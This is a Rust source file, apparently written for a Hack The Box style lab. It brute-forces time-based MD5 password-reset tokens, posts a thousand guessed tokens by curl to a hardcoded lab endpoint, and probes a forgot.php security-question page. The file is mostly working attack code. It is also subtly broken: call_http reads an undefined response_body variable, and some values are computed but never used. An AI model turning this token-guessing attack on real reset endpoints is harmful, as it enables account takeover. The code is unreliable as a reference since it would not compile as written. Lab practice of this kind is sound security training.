use std::process::Command;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use colored::Colorize;
use crate::greed::Cli;

use md5;

pub fn check_token(greed: &Cli) -> bool {
    let current_time = greed.time.as_ref().unwrap() - 5000;

    println!("Time: {}", current_time);
    println!("Hash: {}", greed.hash.as_ref().unwrap());

    for i in 0..10000 {
        let hash_string = format!("{}{}", greed.keyword.as_ref().unwrap(), greed.time.as_ref().unwrap() + i);
        let digest = md5::compute(hash_string.as_bytes());

        if format!("{:X}", digest) == greed.hash.as_ref().unwrap().to_string().to_uppercase() {
            println!("{}", format!("token found!").green());
            println!("at time {}", greed.time.as_ref().unwrap() + i);
            return true
        }
    }

    println!("{}", format!("token not found").red());
    false
}

pub fn call_http(_greed: &Cli) {
    // let sleep_duration = Duration::from_millis(100); // 100 milliseconds

    for i in 0..1000 {
        let start = SystemTime::now();
        let since_the_epoch = start
            .duration_since(UNIX_EPOCH)
            .expect("Time went backwards");

        let mut time_now:u128 = 1694621265436;
        time_now = time_now - 1000;
        time_now = time_now + i;
        let hash_string = format!("{}{}", "htbadmin", time_now );
        let digest = md5::compute(hash_string.as_bytes());
        let mut curl = Command::new("curl");
        curl.arg("-X").arg("POST").arg("http://94.237.62.195:32695/question1/")
            .arg("--data-urlencode").arg(format!("token={:X}", digest).to_lowercase())
            .arg("--data-urlencode").arg("submit=check");
        let output = curl.output().expect("Failed to execute command");
        println!("{} : curl command: {:?}", time_now , curl);
        // Check if the command was successful
        if output.status.success() {
            // Convert the output bytes to a string

            if !response_body.contains("Wrong token") {
                println!("Response Body:\n{}", response_body);
            }
        } else {
            eprintln!("Error: Command failed with {:?}", output.status);
        }
    }
}

pub fn guess_question(_greed: &Cli) {
    // let sleep_duration = Duration::from_millis(100); // 100 milliseconds
    let mut colors = ["red", "blue", "purple", "green"];
    let mut pizza_flavors = ["peperoni"];

    let mut curl = Command::new("curl");
    curl.arg("-X").arg("GET").arg("http://94.237.48.48:44303/forgot.php");
    let output = curl.output().expect("Failed to execute command");

    if output.status.success() {
        let response_body = String::from_utf8_lossy(&output.stdout);
        if response_body.contains("pizza flavour") {
            println!("pizza flavor");
        }
    }


}